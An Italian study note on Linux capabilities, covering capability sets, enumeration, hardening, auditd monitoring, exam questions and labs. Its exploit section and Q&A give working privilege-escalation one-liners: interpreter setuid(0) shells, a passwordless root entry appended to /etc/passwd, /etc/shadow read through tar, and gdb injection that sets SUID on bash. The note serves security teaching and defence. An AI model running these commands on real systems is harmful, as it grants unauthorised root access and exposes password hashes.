---
tipo: concetto
tag: [linux]
fase: 2
fonti: 3
aggiornato: 2026-07-02
stato: maturo
aliases: ["Capabilities", "Capabilities Linux", "Linux Capabilities"]
---

# Capabilities Linux

> **Nota etica**: tecniche di privesc solo in lab autorizzati o engagement con permesso scritto.

## In breve

Le **capabilities** Linux frammentano l'onnipotenza di `root` in circa 40 **privilegi atomici**, ognuno assegnabile indipendentemente a un singolo thread o file eseguibile. Nascono come principio di *least privilege*: invece di dare all'intero processo i poteri di root, gli si assegna solo la capability minima necessaria (es. `ping` riceve `CAP_NET_RAW`, non root pieno). Tuttavia, alcune capabilities equivalgono de facto a root e, se assegnate a binari sfruttabili, diventano vettori diretti di [[Privilege Escalation Linux]].

---

## Meccanismo interno

### Storia e motivazione

Prima delle capabilities (kernel < 2.2), il modello di sicurezza era binario: UID 0 (onnipotente) o utente normale. Per aprire una porta < 1024, leggere `/etc/shadow`, usare raw socket — tutto richiedeva UID 0 completo. Questo violava il principio di least privilege: un daemon di rete con un singolo bug aveva accesso a tutto il sistema.

Le capabilities (introdotte con il kernel 2.2, standardizzate in POSIX 1003.1e) risolvono questo problema.

### Set di capabilities per processo

Ogni thread del kernel mantiene tre set di capabilities:

| Set | Descrizione |
|---|---|
| **Permitted (P)** | Pool massimo di capabilities che il thread può avere |
| **Effective (E)** | Capabilities attualmente attive, usate per i controlli del kernel |
| **Inheritable (I)** | Capabilities che possono essere ereditate attraverso `exec()` |

### File capabilities

I file eseguibili possono avere capabilities associate (alternativa al bit [[SUID e SGID]]):

| Set file | Effetto |
|---|---|
| **Permitted (fp)** | Aggiunto al Permitted del processo figlio |
| **Inheritable (fi)** | AND con l'Inheritable del processo |
| **Effective bit (fe)** | Se impostato, Permitted → Effective automaticamente all'exec |

Il suffisso nei comandi `getcap`/`setcap` riflette questi set: `cap_net_raw+ep` significa "aggiunge al Permitted E all'Effective" (il caso più comune e il più pericoloso).

---

## Capabilities chiave

### Tabella completa delle pericolose

| Capability | Perché è root-equivalente | Binari tipicamente a rischio |
|---|---|---|
| `cap_setuid` | Il processo può chiamare `setuid(0)` → diventa root | python, perl, ruby, node |
| `cap_setgid` | Analogo per GID | stessi interpreti |
| `cap_dac_override` | Bypassa **tutti** i controlli di permesso su file (lettura, scrittura, exec) | vim, nano, cp, cat |
| `cap_dac_read_search` | Bypassa lettura e ricerca in directory (read `/etc/shadow`) | tar, find, cat |
| `cap_sys_admin` | "Quasi root": mount/umount, namespace, quotactl, sethostname, ptrace limitato | qualunque shell/strumento di amministrazione |
| `cap_sys_ptrace` | Inietta codice in qualsiasi processo, inclusi quelli root | gdb, strace |
| `cap_net_raw` | Raw socket, sniffing, spoofing | tcpdump, ping, scapy |
| `cap_net_bind_service` | Binding su porte < 1024 senza root | nginx, apache, node (uso legittimo) |
| `cap_chown` | Cambia owner di qualsiasi file | chown, cp (uso legittimo) |
| `cap_sys_module` | Carica/scarica moduli kernel | modprobe (uso legittimo) |
| `cap_sys_rawio` | Accesso diretto a I/O, memoria `/dev/mem` | hdparm, iopl |

### Capabilities a basso rischio (uso legittimo comune)

| Capability | Uso tipico |
|---|---|
| `cap_net_bind_service` | Server web che aprono la porta 80/443 |
| `cap_net_raw` | `ping` per ICMP raw socket |
| `cap_kill` | Inviare segnali a processi di altri utenti |
| `cap_audit_write` | Scrivere nel log auditd |

---

## Enumerazione

```bash
# Trova TUTTI i binari con file capabilities impostate (ricorsivo)
getcap -r / 2>/dev/null

# Output tipico di un sistema vulnerabile:
# /usr/bin/python3.8 = cap_setuid+ep
# /usr/bin/perl = cap_setuid+ep
# /usr/bin/tar = cap_dac_read_search+ep
# /usr/sbin/tcpdump = cap_net_raw+ep

# Capabilities del processo corrente
cat /proc/self/status | grep Cap
# CapInh, CapPrm, CapEff, CapBnd, CapAmb (valori esadecimali)
capsh --decode=0000000000000000   # decodifica i valori hex

# Capabilities di un processo specifico
cat /proc/<PID>/status | grep Cap

# Verifica se un binario ha capabilities
getcap /usr/bin/python3
```

---

## Exploit — tecniche pratiche

### cap_setuid su interprete (più comune)

```bash
# Sistema: /usr/bin/python3 = cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# → shell root

# Con perl
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# Con ruby
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# Con node
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'
```

### cap_dac_override — scrittura arbitraria

```bash
# Sistema: /usr/bin/vim = cap_dac_override+ep
# Posso modificare qualsiasi file, incluso /etc/passwd

# Aggiungo un utente root senza password
echo 'hacked::0:0:root:/root:/bin/bash' >> /etc/passwd
su hacked   # → shell root senza password

# Oppure con nano/cat/cp
cp /etc/shadow /tmp/shadow_copy    # leggo file protetti
```

### cap_dac_read_search — lettura arbitraria

```bash
# Sistema: /usr/bin/tar = cap_dac_read_search+ep
tar -czf /tmp/shadow.tar.gz /etc/shadow 2>/dev/null
tar -xzf /tmp/shadow.tar.gz -C /tmp
cat /tmp/etc/shadow   # → hash delle password

# Con find
find /root -name "*.txt" 2>/dev/null   # legge directory di root
```

### cap_sys_ptrace — injection in processo root

```bash
# Sistema: gdb con cap_sys_ptrace
# Trova un processo root da cui iniettare una shell
ps aux | grep root

gdb -p <PID_root>
# In gdb:
call system("chmod u+s /bin/bash")
quit

bash -p   # → bash con EUID=0
```

### cap_net_raw — sniffing di rete

```bash
# Sistema: /usr/bin/tcpdump = cap_net_raw+ep
tcpdump -i eth0 -w /tmp/capture.pcap   # cattura traffico di rete
# Può intercettare credenziali in chiaro su protocolli come HTTP, FTP, Telnet
```

### Consultare GTFOBins

Per ogni binario con capabilities, GTFOBins (https://gtfobins.github.io) ha una sezione dedicata *Capabilities* con il payload esatto da usare.

---

## Confronto: Capabilities vs SUID

| Aspetto | SUID | Capabilities |
|---|---|---|
| Meccanismo | Cambia EUID al proprietario del file (spesso root) | Assegna solo i privilegi atomici specificati |
| Granularità | Binaria (tutto o niente) | Fine-grained (~40 capabilities) |
| Visibilità | `find / -perm -4000` | `getcap -r /` |
| Revoca | `chmod -s binary` | `setcap -r binary` |
| Equivalenza root | Sempre (se proprietario root) | Solo per cap pericolose (`cap_setuid`, `cap_sys_admin`) |
| Uso legittimo | `/usr/bin/sudo`, `/usr/bin/passwd` | `ping` (`cap_net_raw`), server web (`cap_net_bind_service`) |

Entrambi compaiono nella checklist di [[Privilege Escalation Linux]] e vengono enumerati da [[PEAS|LinPEAS]].

---

## Gestione con setcap/getcap

```bash
# Assegnare una capability a un binario
setcap cap_net_raw+ep /usr/bin/ping

# Rimuovere tutte le capabilities da un binario
setcap -r /usr/bin/ping

# Mostrare le capabilities di un singolo file
getcap /usr/bin/ping
# Output: /usr/bin/ping = cap_net_raw+ep

# Enumerazione ricorsiva
getcap -r / 2>/dev/null

# Manipolazione programmatica (root): libcap
# apt install libcap-dev
```

Suffissi nel formato `cap_nome+FLAGS`:
- `e` = Effective
- `p` = Permitted
- `i` = Inheritable
- `+ep` = il caso più permissivo: attivo immediatamente all'esecuzione

---

## Hardening

| Misura | Comando / Dettaglio |
|---|---|
| Audit periodico | `getcap -r / 2>/dev/null` — verificare che nessun interprete o tool di lettura abbia capabilities pericolose |
| Rimozione capabilities superflue | `setcap -r /path/to/binary` |
| Evitare cap su interpreti | Mai assegnare `cap_setuid` o `cap_dac_override` a python, perl, ruby, node |
| Monitoraggio | auditd: regola su `setcap` (syscall `setxattr` con prefisso `security.capability`) |
| Ambient capabilities | Evitare l'uso di ambient capabilities nei container senza policy esplicita |
| Seccomp + AppArmor | Limitano le syscall disponibili anche se il processo ha capabilities |
| Container security | In Docker, `--cap-drop=ALL --cap-add=CAP_NET_BIND_SERVICE` per least privilege |

### Regola auditd per capabilities

```
-a always,exit -F arch=b64 -S setxattr -F key=capabilities
```

MITRE ATT&CK: **T1548.001** (Setuid and Setgid) — le capabilities rientrano nello stesso gruppo di tecniche di abuso dei meccanismi di elevazione.

---

## Troubleshooting

| Sintomo | Causa | Soluzione |
|---|---|---|
| `getcap` non mostra nulla | Binario senza capabilities o percorso errato | Verificare con percorso assoluto; usare `getcap -r /usr` |
| `setcap` fallisce con "Operation not permitted" | Non si è root o il filesystem è montato con `nosuid` | Eseguire come root; verificare opzioni di mount |
| Capability assegnata ma non funziona | Set sbagliato: solo `+p` senza `+e` | Usare `+ep` per attivazione immediata |
| `cap_net_raw` assegnata ma ping non funziona | Kernel con `net.ipv4.ping_group_range` configurato | Verificare `sysctl net.ipv4.ping_group_range` |
| Capability persa dopo aggiornamento pacchetto | Il package manager sovrascrive il binario | Riapplicare con `setcap`; valutare alternativa systemd |

---

## Domande da esame/colloquio

**Q1: Perché le capabilities Linux sono state introdotte?**
Per spezzare il modello binario privilegiato/non-privilegiato. Prima, qualsiasi operazione privilegiata richiedeva UID 0 completo. Con le capabilities, si assegna al processo solo il privilegio atomico necessario (es. `CAP_NET_RAW` per ping, `CAP_NET_BIND_SERVICE` per un web server sulla porta 80), applicando il principio di least privilege.

**Q2: Qual è la differenza tra `cap_dac_override` e `cap_dac_read_search`?**
`cap_dac_override` bypassa tutti i controlli DAC su file (lettura, scrittura, esecuzione) — equivale praticamente a poter fare qualsiasi cosa sui file. `cap_dac_read_search` bypassa solo i permessi di lettura e di ricerca nelle directory — permette di leggere file protetti ma non di modificarli o eseguirli.

**Q3: Come si sfrutta `cap_setuid` assegnata a Python per ottenere root?**
Con `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`. Il processo Python ha nel suo set Effective la capability `cap_setuid`, quindi può chiamare la syscall `setuid(0)` per diventare root, poi lanciare una shell.

**Q4: Qual è la differenza tra SUID e capabilities, in termini di sicurezza?**
SUID è binario: il processo ottiene tutti i privilegi del proprietario (se root, è root pieno). Le capabilities sono granulari: il processo ottiene solo i privilegi atomici specificati. In pratica però, alcune capabilities (`cap_setuid`, `cap_sys_admin`, `cap_dac_override`) equivalgono a root pieno, quindi la granularità è reale solo per capabilities "safe" come `cap_net_bind_service`.

**Q5: Come enumeri le capabilities in un pentest e cosa cerchi?**
Con `getcap -r / 2>/dev/null`. Cerco capabilities pericolose su binari sfruttabili: `cap_setuid`/`cap_setgid` su interpreti (python, perl, ruby), `cap_dac_override`/`cap_dac_read_search` su tool di lettura/scrittura (cat, vim, tar, cp), `cap_sys_ptrace` su debugger, `cap_sys_admin` su qualsiasi strumento.

**Q6: Come si rimuove una capability da un binario e come si monitora che non venga riassegnata?**
Si usa `setcap -r /path/to/binary` (richiede root). Per il monitoraggio: auditd con una regola sulla syscall `setxattr` con chiave `security.capability` registra ogni modifica alle file capabilities. Strumenti di file integrity come AIDE rilevano le modifiche agli xattr dei binari critici.

---

## Lab

- **[[TryHackMe]] – Linux PrivEsc** (`tryhackme.com/room/linuxprivesc`): il task **Capabilities** parte da `getcap -r / 2>/dev/null`, individua un interprete con `cap_setuid+ep` e lo sfrutta con `setuid(0)` — l'exploit centrale di questa nota.
- **[[GTFOBins]]** (funzione *Capabilities*): dopo aver enumerato con `getcap -r /`, cerca ogni binario trovato sotto la categoria *Capabilities* e applica il payload esatto (python/perl/tar/gdb). Serve a mappare capability → primitiva (setuid vs read vs write).
- **Esercizio locale (VM personale)**: assegna `setcap cap_setuid+ep /usr/bin/python3` e ottieni root con l'one-liner; poi prova `cap_dac_read_search+ep` su `tar` per leggere `/etc/shadow`. Infine `setcap -r` e verifica con auditd (`setxattr` chiave `capabilities`) che la modifica venga registrata.
- **[[HackTheBox]] – HTB Academy, modulo *Linux Privilege Escalation***: sezione dedicata alle capabilities all'interno di scenari completi.

## Collegamenti

- [[Privilege Escalation Linux]] — vettore in checklist
- [[SUID e SGID]] — meccanismo affine e complementare
- [[Permessi Linux]]
- [[Processi Linux]]
- [[PEAS|LinPEAS]]

## Fonti

- man capabilities(7): https://man7.org/linux/man-pages/man7/capabilities.7.html
- HackTricks — Linux Capabilities: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities
- GTFOBins — Capabilities: https://gtfobins.github.io/#+capabilities
